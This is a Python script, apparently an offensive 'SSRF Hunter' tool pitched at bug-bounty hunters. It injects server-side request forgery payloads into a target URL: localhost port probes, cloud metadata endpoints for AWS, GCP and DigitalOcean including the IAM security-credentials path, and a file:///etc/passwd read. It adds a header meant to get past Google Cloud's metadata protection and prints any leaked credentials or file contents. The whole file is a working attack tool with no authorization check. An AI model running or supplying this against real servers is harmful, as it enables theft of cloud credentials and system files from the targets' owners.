import requests
import sys
import time

def hunt_ssrf(target_url):
    print(f"\n[*] Bhai, starting The Cloud Assassin: SSRF (Server-Side Request Forgery) Hunter...")
    print(f"[*] Target Parameter injected at -> {target_url}\n")
    print("==================================================")

    # The Hacker's Ultimate SSRF Payload Dictionary
    ssrf_payloads = {
        "Localhost Port Scan (Port 22)": "http://127.0.0.1:22",
        "Localhost Port Scan (Port 80)": "http://localhost:80",
        "Local Admin Panel": "http://127.0.0.1/admin",
        "AWS Metadata (IAM Keys)": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "AWS User Data": "http://169.254.169.254/latest/user-data",
        "GCP Metadata (Google Cloud)": "http://metadata.google.internal/computeMetadata/v1/",
        "DigitalOcean Metadata": "http://169.254.169.254/metadata/v1.json",
        "Local File Read (/etc/passwd)": "file:///etc/passwd"
    }

    found_vulns = 0

    print("[*] Launching internal network mapping and Cloud Metadata extraction...\n")

    for payload_name, payload in ssrf_payloads.items():
        # Replace the FUZZ keyword in the target URL with our internal payload
        attack_url = target_url.replace("FUZZ", payload)
        
        # We need specific headers for GCP to bypass their SSRF protection
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Arch Linux x86_64) SSRF-Sniper/1.0",
            "Metadata-Flavor": "Google" # Required for Google Cloud SSRF
        }

        try:
            response = requests.get(attack_url, headers=headers, timeout=8)
            status = response.status_code
            text = response.text.lower()

            # Logic to detect successful SSRF:
            # 1. Root user found in local file
            # 2. AWS IAM roles found
            # 3. HTTP 200 on an internal localhost port
            if "root:x:" in text or "ami-id" in text or "security-credentials" in text or "ssh-rsa" in text:
                print(f"   [!!!] JACKPOT 🎯 CRITICAL SSRF VULNERABILITY FOUND!")
                print(f"   [!!!] Attack Type: {payload_name}")
                print(f"   [!!!] Payload: {payload}")
                print(f"   [!!!] Data Leaked: {response.text[:150]}...")
                print("-" * 50)
                found_vulns += 1
            
            elif status == 200 and len(text) > 0:
                print(f"   [?] Potential SSRF/Open Port: {payload_name} -> HTTP 200")
                print(f"       Data Snippet: {response.text[:50]}...")
            else:
                print(f"   [-] Blocked/Filtered: {payload_name}")

            time.sleep(0.5)

        except requests.exceptions.RequestException:
             print(f"   [!] Timeout/Error (Server might be dropping internal packets): {payload_name}")

    print("\n==================================================")
    if found_vulns > 0:
        print(f"[+] Scan Complete! Found {found_vulns} High-Severity SSRF Leaks. Claim your Bug Bounty! 💸")
    else:
        print("[-] Scan Complete. The server seems to properly sanitize internal requests.")

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    if len(sys.argv) != 2:
        print("Usage: python3 ssrf_hunter.py <Target_URL_with_FUZZ>")
        print("Example: python3 ssrf_hunter.py 'https://target.com/fetch_profile?image_url=FUZZ'")
        sys.exit(1)
        
    url = sys.argv[1]
    
    if "FUZZ" not in url:
        print("[-] ERROR: Target URL must contain the word 'FUZZ' where the SSRF payload should go.")
        sys.exit(1)
        
    hunt_ssrf(url)
